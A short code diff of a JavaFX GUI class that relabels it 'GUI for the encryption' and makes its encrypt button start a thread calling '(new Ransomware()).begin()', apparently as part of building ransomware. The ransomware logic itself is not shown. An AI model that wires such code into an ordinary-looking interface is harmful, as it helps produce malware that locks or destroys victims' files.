@@ -10,7 +10,7 @@ import javafx.stage.Stage;
 import javafx.stage.WindowEvent;
 
 /**
- * GUI to implement the RefrigeratorDisplay interface.
+ * GUI for the encryption.
  */
 public class GUI extends Application {
 	private Button encrypt;
@@ -29,7 +29,7 @@ public class GUI extends Application {
 				new Thread() {
 					@Override
 					public void run() {
-						Driver.encrypt();
+						(new Ransomware()).begin();
 					}
 				};
 			}
